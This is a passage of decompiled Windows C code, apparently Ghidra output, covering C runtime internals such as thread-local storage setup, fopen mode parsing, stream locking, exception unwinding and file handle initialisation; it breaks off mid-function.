void FUN_0040cefa(void)

{
  FUN_0040df7b(0xc);
  return;
}



undefined4 FUN_0040cf03(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  undefined (*pauVar4) [16];
  DWORD DVar5;
  undefined *puVar6;
  undefined (*pauVar7) [16];
  
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c2a0);
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)FUN_0040eb7c(u_KERNEL32_DLL_0041c2a0);
  }
  if (hModule != (HMODULE)0x0) {
    DAT_00423d08 = GetProcAddress(hModule,s_FlsAlloc_0041c2ec);
    DAT_00423d0c = GetProcAddress(hModule,s_FlsGetValue_0041c2e0);
    DAT_00423d10 = GetProcAddress(hModule,s_FlsSetValue_0041c2d4);
    DAT_00423d14 = GetProcAddress(hModule,s_FlsFree_0041c2cc);
    if ((((DAT_00423d08 == (FARPROC)0x0) || (DAT_00423d0c == (FARPROC)0x0)) ||
        (DAT_00423d10 == (FARPROC)0x0)) || (DAT_00423d14 == (FARPROC)0x0)) {
      DAT_00423d0c = TlsGetValue_exref;
      DAT_00423d08 = (FARPROC)&LAB_0040cbe0;
      DAT_00423d10 = TlsSetValue_exref;
      DAT_00423d14 = TlsFree_exref;
    }
    DAT_004221c4 = TlsAlloc();
    if (DAT_004221c4 == 0xffffffff) {
      return 0;
    }
    BVar1 = TlsSetValue(DAT_004221c4,DAT_00423d0c);
    if (BVar1 == 0) {
      return 0;
    }
    FUN_0040ee66();
    DAT_00423d08 = (FARPROC)FUN_0040caf3((int)DAT_00423d08);
    DAT_00423d0c = (FARPROC)FUN_0040caf3((int)DAT_00423d0c);
    DAT_00423d10 = (FARPROC)FUN_0040caf3((int)DAT_00423d10);
    DAT_00423d14 = (FARPROC)FUN_0040caf3((int)DAT_00423d14);
    iVar2 = FUN_0040ded9();
    if (iVar2 != 0) {
      puVar6 = &LAB_0040cdd4;
      pcVar3 = (code *)FUN_0040cb6e((int)DAT_00423d08);
      DAT_004221c0 = (*pcVar3)(puVar6);
      if ((DAT_004221c0 != -1) &&
         (pauVar4 = FUN_00413b97(1,0x214), pauVar4 != (undefined (*) [16])0x0)) {
        iVar2 = DAT_004221c0;
        pauVar7 = pauVar4;
        pcVar3 = (code *)FUN_0040cb6e((int)DAT_00423d10);
        iVar2 = (*pcVar3)(iVar2,pauVar7);
        if (iVar2 != 0) {
          FUN_0040cc5a();
          DVar5 = GetCurrentThreadId();
          *(undefined4 *)(*pauVar4 + 4) = 0xffffffff;
          *(DWORD *)*pauVar4 = DVar5;
          return 1;
        }
      }
    }
  }
  FUN_0040cc1d();
  return 0;
}



undefined * FUN_0040d090(void)

{
  return &DAT_004221c8;
}



void __cdecl FUN_0040d167(undefined *param_1)

{
  if ((param_1 < &DAT_004221c8) || (&DAT_00422428 < param_1)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x20));
  }
  else {
    FUN_0040e055(((int)(param_1 + -0x4221c8) >> 5) + 0x10);
    *(uint *)(param_1 + 0xc) = *(uint *)(param_1 + 0xc) | 0x8000;
  }
  return;
}



void __cdecl FUN_0040d1a8(int param_1,int param_2)

{
  if (param_1 < 0x14) {
    FUN_0040e055(param_1 + 0x10);
    *(uint *)(param_2 + 0xc) = *(uint *)(param_2 + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(param_2 + 0x20));
  return;
}



void __cdecl FUN_0040d1da(uint param_1)

{
  if ((0x4221c7 < param_1) && (param_1 < 0x422429)) {
    *(uint *)(param_1 + 0xc) = *(uint *)(param_1 + 0xc) & 0xffff7fff;
    FUN_0040df7b(((int)(param_1 - 0x4221c8) >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x20));
  return;
}



void __cdecl FUN_0040d216(int param_1,int param_2)

{
  if (param_1 < 0x14) {
    *(uint *)(param_2 + 0xc) = *(uint *)(param_2 + 0xc) & 0xffff7fff;
    FUN_0040df7b(param_1 + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_2 + 0x20));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl
FUN_0040d245(undefined4 param_1,short *param_2,undefined4 param_3,undefined4 *param_4)

{
  short sVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  bool bVar5;
  ushort uVar6;
  undefined4 *puVar7;
  int iVar8;
  uint uVar9;
  short *psVar10;
  ushort *puVar11;
  ushort *puVar12;
  uint local_8;
  
  bVar4 = false;
  bVar3 = false;
  bVar5 = false;
  for (psVar10 = param_2; *psVar10 == 0x20; psVar10 = psVar10 + 1) {
  }
  sVar1 = *psVar10;
  if (sVar1 == 0x61) {
    uVar9 = 0x109;
LAB_0040d2b5:
    local_8 = DAT_00424420 | 2;
  }
  else {
    if (sVar1 != 0x72) {
      if (sVar1 != 0x77) goto LAB_0040d282;
      uVar9 = 0x301;
      goto LAB_0040d2b5;
    }
    uVar9 = 0;
    local_8 = DAT_00424420 | 1;
  }
  bVar2 = true;
  puVar12 = (ushort *)(psVar10 + 1);
  uVar6 = *puVar12;
  if (uVar6 != 0) {
    do {
      if (!bVar2) break;
      if (uVar6 < 0x54) {
        if (uVar6 == 0x53) {
          if (bVar3) goto LAB_0040d3e3;
          bVar3 = true;
          uVar9 = uVar9 | 0x20;
        }
        else if (uVar6 != 0x20) {
          if (uVar6 == 0x2b) {
            if ((uVar9 & 2) != 0) goto LAB_0040d3e3;
            uVar9 = uVar9 & 0xfffffffe | 2;
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (uVar6 == 0x2c) {
            bVar5 = true;
LAB_0040d3e3:
            bVar2 = false;
          }
          else if (uVar6 == 0x44) {
            if ((uVar9 & 0x40) != 0) goto LAB_0040d3e3;
            uVar9 = uVar9 | 0x40;
          }
          else if (uVar6 == 0x4e) {
            uVar9 = uVar9 | 0x80;
          }
          else {
            if (uVar6 != 0x52) goto LAB_0040d282;
            if (bVar3) goto LAB_0040d3e3;
            bVar3 = true;
            uVar9 = uVar9 | 0x10;
          }
        }
      }
      else if (uVar6 == 0x54) {
        if ((uVar9 & 0x1000) != 0) goto LAB_0040d3e3;
        uVar9 = uVar9 | 0x1000;
      }
      else if (uVar6 == 0x62) {
        if ((uVar9 & 0xc000) != 0) goto LAB_0040d3e3;
        uVar9 = uVar9 | 0x8000;
      }
      else if (uVar6 == 99) {
        if (bVar4) goto LAB_0040d3e3;
        local_8 = local_8 | 0x4000;
        bVar4 = true;
      }
      else if (uVar6 == 0x6e) {
        if (bVar4) goto LAB_0040d3e3;
        local_8 = local_8 & 0xffffbfff;
        bVar4 = true;
      }
      else {
        if (uVar6 != 0x74) goto LAB_0040d282;
        if ((uVar9 & 0xc000) != 0) goto LAB_0040d3e3;
        uVar9 = uVar9 | 0x4000;
      }
      puVar12 = puVar12 + 1;
      uVar6 = *puVar12;
    } while (uVar6 != 0);
    if (bVar5) {
      for (; *puVar12 == 0x20; puVar12 = puVar12 + 1) {
      }
      iVar8 = FUN_0040becf((ushort *)&DAT_0041c2f8,puVar12,3);
      if (iVar8 != 0) goto LAB_0040d282;
      for (puVar12 = puVar12 + 3; *puVar12 == 0x20; puVar12 = puVar12 + 1) {
      }
      if (*puVar12 != 0x3d) goto LAB_0040d282;
      do {
        puVar11 = puVar12;
        puVar12 = puVar11 + 1;
      } while (*puVar12 == 0x20);
      iVar8 = FUN_004145c6(puVar12,(ushort *)u_UTF_8_0041c300,5);
      if (iVar8 == 0) {
        puVar12 = puVar11 + 6;
        uVar9 = uVar9 | 0x40000;
      }
      else {
        iVar8 = FUN_004145c6(puVar12,(ushort *)u_UTF_16LE_0041c30c,8);
        if (iVar8 == 0) {
          puVar12 = puVar11 + 9;
          uVar9 = uVar9 | 0x20000;
        }
        else {
          iVar8 = FUN_004145c6(puVar12,(ushort *)u_UNICODE_0041c320,7);
          if (iVar8 != 0) goto LAB_0040d282;
          puVar12 = puVar11 + 8;
          uVar9 = uVar9 | 0x10000;
        }
      }
    }
  }
  for (; *puVar12 == 0x20; puVar12 = puVar12 + 1) {
  }
  if (*puVar12 == 0) {
    iVar8 = FUN_004144bc(&param_2,param_1,uVar9,param_3,0x180);
    if (iVar8 != 0) {
      return (undefined4 *)0x0;
    }
    _DAT_00423d18 = _DAT_00423d18 + 1;
    param_4[3] = local_8;
    param_4[1] = 0;
    *param_4 = 0;
    param_4[2] = 0;
    param_4[7] = 0;
    param_4[4] = param_2;
    return param_4;
  }
LAB_0040d282:
  puVar7 = (undefined4 *)FUN_0040caaa();
  *puVar7 = 0x16;
  FUN_0040ca42();
  return (undefined4 *)0x0;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 * FUN_0040d4f9(void)

{
  int *piVar1;
  uint uVar2;
  undefined4 *puVar3;
  int iVar4;
  LPVOID pvVar5;
  int unaff_EBP;
  int iVar6;
  undefined4 *puVar7;
  
  FUN_0040d634(&DAT_00420498,0x10);
  puVar7 = (undefined4 *)0x0;
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  FUN_0040e055(1);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  iVar6 = 0;
  do {
    *(int *)(unaff_EBP + -0x20) = iVar6;
    if (DAT_004268e0 <= iVar6) {
LAB_0040d5f7:
      if (puVar7 != (undefined4 *)0x0) {
        puVar7[3] = puVar7[3] & 0x8000;
        puVar7[1] = 0;
        puVar7[2] = 0;
        *puVar7 = 0;
        puVar7[7] = 0;
        puVar7[4] = 0xffffffff;
      }
      *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
      FUN_0040d628();
      return puVar7;
    }
    piVar1 = (int *)(DAT_004258c0 + iVar6 * 4);
    if (*piVar1 == 0) {
      iVar6 = iVar6 * 4;
      pvVar5 = FUN_00413b52(0x38);
      *(LPVOID *)(iVar6 + DAT_004258c0) = pvVar5;
      if (*(int *)(DAT_004258c0 + iVar6) != 0) {
        iVar4 = FUN_0041467b();
        if (iVar4 == 0) {
          FUN_0040b61e();
          *(undefined4 *)(iVar6 + DAT_004258c0) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(iVar6 + DAT_004258c0) + 0x20));
          puVar7 = *(undefined4 **)(iVar6 + DAT_004258c0);
          *(undefined4 **)(unaff_EBP + -0x1c) = puVar7;
          puVar7[3] = 0;
        }
      }
      goto LAB_0040d5f7;
    }
    uVar2 = *(uint *)(*piVar1 + 0xc);
    if (((uVar2 & 0x83) == 0) && ((uVar2 & 0x8000) == 0)) {
      if (iVar6 - 3U < 0x11) {
        iVar4 = FUN_0040df92();
        if (iVar4 == 0) goto LAB_0040d5f7;
      }
      FUN_0040d1a8(iVar6,*(int *)(DAT_004258c0 + iVar6 * 4));
      puVar3 = *(undefined4 **)(DAT_004258c0 + iVar6 * 4);
      if ((*(byte *)(puVar3 + 3) & 0x83) == 0) {
        *(undefined4 **)(unaff_EBP + -0x1c) = puVar3;
        puVar7 = puVar3;
        goto LAB_0040d5f7;
      }
      FUN_0040d216(iVar6,(int)puVar3);
    }
    iVar6 = iVar6 + 1;
  } while( true );
}



void FUN_0040d628(void)

{
  FUN_0040df7b(1);
  return;
}



// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2

void __cdecl FUN_0040d634(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *unaff_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00422044 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  *unaff_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: This is an inlined function

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 *unaff_FS_OFFSET;
  undefined4 unaff_retaddr;
  
  *unaff_FS_OFFSET = unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



undefined4 __fastcall
FUN_0040d690(undefined4 param_1,undefined4 param_2,int *param_3,PVOID param_4,undefined4 param_5)

{
  int iVar1;
  uint uVar2;
  undefined4 extraout_EDX;
  int **ppiVar3;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar4;
  int **extraout_EDX_02;
  PVOID pvVar5;
  int *piVar6;
  undefined8 uVar7;
  int *local_1c;
  undefined4 local_18;
  PVOID *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar6 = (int *)(*(uint *)((int)param_4 + 8) ^ DAT_00422044);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_4 + 0x10;
  if (*piVar6 != -2) {
    FUN_0040a982(piVar6[1] + iVar1 ^ *(uint *)(*piVar6 + iVar1),param_2);
    param_2 = extraout_EDX;
  }
  FUN_0040a982(piVar6[3] + iVar1 ^ *(uint *)(piVar6[2] + iVar1),param_2);
  pvVar5 = param_4;
  if ((*(byte *)(param_3 + 1) & 0x66) == 0) {
    ppiVar3 = &local_1c;
    *(int ***)((int)param_4 + -4) = ppiVar3;
    pvVar5 = *(PVOID *)((int)param_4 + 0xc);
    local_1c = param_3;
    local_18 = param_5;
    if (pvVar5 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (PVOID *)(piVar6 + (int)pvVar5 * 3 + 4);
      local_c = *local_14;
      if ((undefined *)piVar6[(int)pvVar5 * 3 + 5] != (undefined *)0x0) {
        uVar7 = FUN_0040d90e((undefined *)piVar6[(int)pvVar5 * 3 + 5]);
        ppiVar3 = (int **)((ulonglong)uVar7 >> 0x20);
        local_5 = '\x01';
        if ((int)uVar7 < 0) {
          local_10 = 0;
          goto LAB_0040d738;
        }
        if (0 < (int)uVar7) {
          if (((*param_3 == -0x1f928c9d) && (DAT_00420088 != (code *)0x0)) &&
             (uVar2 = FUN_00414770(0x420088), uVar2 != 0)) {
            (*DAT_00420088)(param_3,1);
          }
          FUN_0040d93e(param_4);
          uVar4 = extraout_EDX_00;
          if (*(PVOID *)((int)param_4 + 0xc) != pvVar5) {
            FUN_0040d958((int)param_4,(uint)pvVar5,iVar1,&DAT_00422044);
            uVar4 = extraout_EDX_01;
          }
          *(PVOID *)((int)param_4 + 0xc) = local_c;
          if (*piVar6 != -2) {
            FUN_0040a982(piVar6[1] + iVar1 ^ *(uint *)(*piVar6 + iVar1),uVar4);
          }
          FUN_0040a982(piVar6[3] + iVar1 ^ *(uint *)(piVar6[2] + iVar1),piVar6[2]);
          FUN_0040d925((undefined *)local_14[2]);
          goto LAB_0040d7fc;
        }
      }
      pvVar5 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_0040d7fc:
    if (*(int *)((int)pvVar5 + 0xc) == -2) {
      return local_10;
    }
    FUN_0040d958((int)pvVar5,0xfffffffe,iVar1,&DAT_00422044);
    ppiVar3 = extraout_EDX_02;
  }
LAB_0040d738:
  if (*piVar6 != -2) {
    FUN_0040a982(piVar6[1] + iVar1 ^ *(uint *)(*piVar6 + iVar1),ppiVar3);
  }
  FUN_0040a982(piVar6[3] + iVar1 ^ *(uint *)(piVar6[2] + iVar1),piVar6[2]);
  return local_10;
}



void __cdecl FUN_0040d81c(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *unaff_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_0040d8ac;
  uStack_28 = *unaff_FS_OFFSET;
  local_20 = DAT_00422044 ^ (uint)&uStack_28;
  *unaff_FS_OFFSET = &uStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      FUN_00414945(0x101);
      FUN_00414964();
    }
  }
  *unaff_FS_OFFSET = uStack_28;
  return;
}



void FUN_0040d8f2(int param_1)

{
  FUN_0040d81c(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



void __fastcall FUN_0040d90e(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



void __fastcall FUN_0040d925(undefined *UNRECOVERED_JUMPTABLE)

{
  FUN_00414945(1);
                    // WARNING: Could not recover jumptable at 0x0040d93c. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



void __fastcall FUN_0040d93e(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x40d953,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



void __fastcall FUN_0040d958(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  FUN_0040d81c(param_4,param_1,param_2);
  return;
}



DWORD __cdecl FUN_0040d96f(uint param_1,LONG param_2,DWORD param_3)

{
  byte *pbVar1;
  HANDLE hFile;
  undefined4 *puVar2;
  DWORD DVar3;
  DWORD DVar4;
  
  hFile = (HANDLE)FUN_00414a6e(param_1);
  if (hFile == (HANDLE)0xffffffff) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar3 = SetFilePointer(hFile,param_2,(PLONG)0x0,param_3);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
    }
    else {
      DVar4 = 0;
    }
    if (DVar4 == 0) {
      pbVar1 = (byte *)((&DAT_004257c0)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      FUN_0040cad0(DVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040d9e4(void)

{
  uint uVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  int unaff_EBP;
  int iVar4;
  
  FUN_0040d634(&DAT_004204b8,0x10);
  uVar1 = *(uint *)(unaff_EBP + 8);
  if (uVar1 == 0xfffffffe) {
    puVar2 = (undefined4 *)FUN_0040cabd();
    *puVar2 = 0;
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
  }
  else {
    if ((-1 < (int)uVar1) && (uVar1 < DAT_004257ac)) {
      iVar4 = (uVar1 & 0x1f) * 0x40;
      if ((*(byte *)((&DAT_004257c0)[(int)uVar1 >> 5] + 4 + iVar4) & 1) != 0) {
        FUN_00414ae5();
        *(undefined4 *)(unaff_EBP + -4) = 0;
        if ((*(byte *)((&DAT_004257c0)[(int)uVar1 >> 5] + 4 + iVar4) & 1) == 0) {
          puVar2 = (undefined4 *)FUN_0040caaa();
          *puVar2 = 9;
          puVar2 = (undefined4 *)FUN_0040cabd();
          *puVar2 = 0;
          *(undefined4 *)(unaff_EBP + -0x1c) = 0xffffffff;
        }
        else {
          DVar3 = FUN_0040d96f(*(uint *)(unaff_EBP + 8),*(LONG *)(unaff_EBP + 0xc),
                               *(DWORD *)(unaff_EBP + 0x10));
          *(DWORD *)(unaff_EBP + -0x1c) = DVar3;
        }
        *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
        FUN_0040dab6();
        return *(undefined4 *)(unaff_EBP + -0x1c);
      }
    }
    puVar2 = (undefined4 *)FUN_0040cabd();
    *puVar2 = 0;
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
    FUN_0040ca42();
  }
  return 0xffffffff;
}



void FUN_0040dab6(void)

{
  int unaff_EBP;
  
  FUN_00414b85(*(uint *)(unaff_EBP + 8));
  return;
}



undefined4 __cdecl FUN_0040dac0(int param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  if (param_1 == 0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    uVar2 = 0xffffffff;
  }
  else {
    uVar2 = *(undefined4 *)(param_1 + 0x10);
  }
  return uVar2;
}



undefined4 __cdecl FUN_0040daf2(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  
  uVar4 = 0;
  if (((((byte)param_1[3] & 3) == 2) && ((param_1[3] & 0x108U) != 0)) &&
     (iVar1 = param_1[2], iVar2 = *param_1, 0 < iVar2 - iVar1)) {
    FUN_0040dac0((int)param_1);
    iVar3 = FUN_0041036b();
    if (iVar3 == iVar2 - iVar1) {
      if ((char)param_1[3] < '\0') {
        param_1[3] = param_1[3] & 0xfffffffd;
      }
    }
    else {
      param_1[3] = param_1[3] | 0x20;
      uVar4 = 0xffffffff;
    }
  }
  param_1[1] = 0;
  *param_1 = param_1[2];
  return uVar4;
}



int __cdecl FUN_0040db5a(int *param_1)

{
  int iVar1;
  
  if (param_1 == (int *)0x0) {
    iVar1 = FUN_0040dba2();
  }
  else {
    iVar1 = FUN_0040daf2(param_1);
    if (iVar1 == 0) {
      if ((param_1[3] & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        FUN_0040dac0((int)param_1);
        iVar1 = FUN_00414d46();
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040dba2(void)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  int unaff_EBP;
  int iVar4;
  
  FUN_0040d634(&DAT_004204d8,0x14);
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  *(undefined4 *)(unaff_EBP + -0x24) = 0;
  FUN_0040e055(1);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  for (iVar4 = 0; *(int *)(unaff_EBP + -0x20) = iVar4, iVar4 < DAT_004268e0; iVar4 = iVar4 + 1) {
    piVar1 = (int *)(DAT_004258c0 + iVar4 * 4);
    if ((*piVar1 != 0) && (iVar2 = *piVar1, (*(byte *)(iVar2 + 0xc) & 0x83) != 0)) {
      FUN_0040d1a8(iVar4,iVar2);
      *(undefined4 *)(unaff_EBP + -4) = 1;
      piVar1 = *(int **)(DAT_004258c0 + iVar4 * 4);
      if ((piVar1[3] & 0x83U) != 0) {
        if (*(int *)(unaff_EBP + 8) == 1) {
          iVar2 = FUN_0040db5a(piVar1);
          if (iVar2 != -1) {
            *(int *)(unaff_EBP + -0x1c) = *(int *)(unaff_EBP + -0x1c) + 1;
          }
        }
        else if ((*(int *)(unaff_EBP + 8) == 0) && ((piVar1[3] & 2U) != 0)) {
          iVar2 = FUN_0040db5a(piVar1);
          if (iVar2 == -1) {
            *(undefined4 *)(unaff_EBP + -0x24) = 0xffffffff;
          }
        }
      }
      *(undefined4 *)(unaff_EBP + -4) = 0;
      FUN_0040dc44();
    }
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  FUN_0040dc73();
  uVar3 = *(undefined4 *)(unaff_EBP + -0x1c);
  if (*(int *)(unaff_EBP + 8) != 1) {
    uVar3 = *(undefined4 *)(unaff_EBP + -0x24);
  }
  return uVar3;
}



void FUN_0040dc44(void)

{
  int unaff_ESI;
  
  FUN_0040d216(unaff_ESI,*(int *)(DAT_004258c0 + unaff_ESI * 4));
  return;
}



void FUN_0040dc73(void)

{
  FUN_0040df7b(1);
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040dc85(void)

{
  undefined (*pauVar1) [16];
  undefined (*pauVar2) [16];
  DWORD DVar3;
  int iVar4;
  HANDLE pvVar5;
  int iVar6;
  undefined4 uVar7;
  UINT *pUVar8;
  int unaff_EBP;
  undefined4 *puVar9;
  UINT UVar10;
  UINT UVar11;
  
  FUN_0040d634(&DAT_00420500,0x54);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  GetStartupInfoA((LPSTARTUPINFOA)(unaff_EBP + -100));
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  pauVar2 = FUN_00413b97(0x20,0x40);
  if (pauVar2 == (undefined (*) [16])0x0) {
LAB_0040ded0:
    uVar7 = 0xffffffff;
  }
  else {
    DAT_004257ac = 0x20;
    DAT_004257c0 = pauVar2;
    for (; pauVar2 < DAT_004257c0 + 0x80; pauVar2 = pauVar2 + 4) {
      (*pauVar2)[4] = 0;
      *(undefined4 *)*pauVar2 = 0xffffffff;
      (*pauVar2)[5] = 10;
      *(undefined4 *)(*pauVar2 + 8) = 0;
      pauVar2[2][4] = 0;
      pauVar2[2][5] = 10;
      pauVar2[2][6] = 10;
      *(undefined4 *)(pauVar2[3] + 8) = 0;
      pauVar2[3][4] = 0;
    }
    if ((*(short *)(unaff_EBP + -0x32) != 0) &&
       (pUVar8 = *(UINT **)(unaff_EBP + -0x30), pUVar8 != (UINT *)0x0)) {
      UVar10 = *pUVar8;
      pUVar8 = pUVar8 + 1;
      *(byte **)(unaff_EBP + -0x1c) = (byte *)((int)pUVar8 + UVar10);
      if (0x7ff < (int)UVar10) {
        UVar10 = 0x800;
      }
      *(undefined4 *)(unaff_EBP + -0x20) = 1;
      while ((UVar11 = UVar10, (int)DAT_004257ac < (int)UVar10 &&
             (pauVar2 = FUN_00413b97(0x20,0x40), UVar11 = DAT_004257ac,
             pauVar2 != (undefined (*) [16])0x0))) {
        iVar4 = *(int *)(unaff_EBP + -0x20);
        (&DAT_004257c0)[iVar4] = pauVar2;
        DAT_004257ac = DAT_004257ac + 0x20;
        pauVar1 = pauVar2;
        for (; pauVar2 < pauVar1 + 0x80; pauVar2 = pauVar2 + 4) {
          (*pauVar2)[4] = 0;
          *(undefined4 *)*pauVar2 = 0xffffffff;
          (*pauVar2)[5] = 10;
          *(undefined4 *)(*pauVar2 + 8) = 0;
          pauVar2[2][4] = pauVar2[2][4] & 0x80;
          pauVar2[2][5] = 10;
          pauVar2[2][6] = 10;
          *(undefined4 *)(pauVar2[3] + 8) = 0;
          pauVar2[3][4] = 0;
          pauVar1 = (&DAT_004257c0)[iVar4];
        }
        *(int *)(unaff_EBP + -0x20) = *(int *)(unaff_EBP + -0x20) + 1;
      }
      *(undefined4 *)(unaff_EBP + -0x20) = 0;
      if (0 < (int)UVar11) {
        do {
          pvVar5 = **(HANDLE **)(unaff_EBP + -0x1c);
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)pUVar8 & 1) != 0)) &&
             (((*(byte *)pUVar8 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            puVar9 = (undefined4 *)
                     ((*(uint *)(unaff_EBP + -0x20) & 0x1f) * 0x40 +
                     (int)(&DAT_004257c0)[(int)*(uint *)(unaff_EBP + -0x20) >> 5]);
            *puVar9 = **(undefined4 **)(unaff_EBP + -0x1c);
            *(byte *)(puVar9 + 1) = *(byte *)pUVar8;
            iVar4 = FUN_0041467b();
            if (iVar4 == 0) goto LAB_0040ded0;
            puVar9[2] = puVar9[2] + 1;
          }
          *(int *)(unaff_EBP + -0x20) = *(int *)(unaff_EBP + -0x20) + 1;
          pUVar8 = (UINT *)((int)pUVar8 + 1);
          *(int *)(unaff_EBP + -0x1c) = *(int *)(unaff_EBP + -0x1c) + 4;
        } while (*(int *)(unaff_EBP + -0x20) < (int)UVar11);
      }
    }
    iVar4 = 0;
    do {
      pauVar2 = DAT_004257c0 + iVar4 * 4;
      if ((*(int *)*pauVar2 == -1) || (*(int *)*pauVar2 == -2)) {
        (*pauVar2)[4] = 0x81;
        if (iVar4 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar4 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          (*pauVar2)[4] = (*pauVar2)[4] | 0x40;
          *(undefined4 *)*pauVar2 = 0xfffffffe;
        }
        else {
          *(HANDLE *)*pauVar2 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            (*pauVar2)[4] = (*pauVar2)[4] | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            (*pauVar2)[4] = (*pauVar2)[4] | 8;
          }
          iVar6 = FUN_0041467b();
          if (iVar6 == 0) goto LAB_0040ded0;
          *(int *)(*pauVar2 + 8) = *(int *)(*pauVar2 + 8) + 1;
        }
      }
      else {
        (*pauVar2)[4] = (*pauVar2)[4] | 0x80;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    SetHandleCount(DAT_004257ac);
    uVar7 = 0;
  }
  return uVar7;
}



undefined4 FUN_0040ded9(void)

{
  int iVar1;
  int iVar2;
  undefined *puVar3;
  
  iVar2 = 0;
  puVar3 = &DAT_00423d20;
  do {
    if ((&DAT_0042248c)[iVar2 * 2] == 1) {
      (&DAT_00422488)[iVar2 * 2] = puVar3;
      puVar3 = puVar3 + 0x18;
      iVar1 = FUN_0041467b();
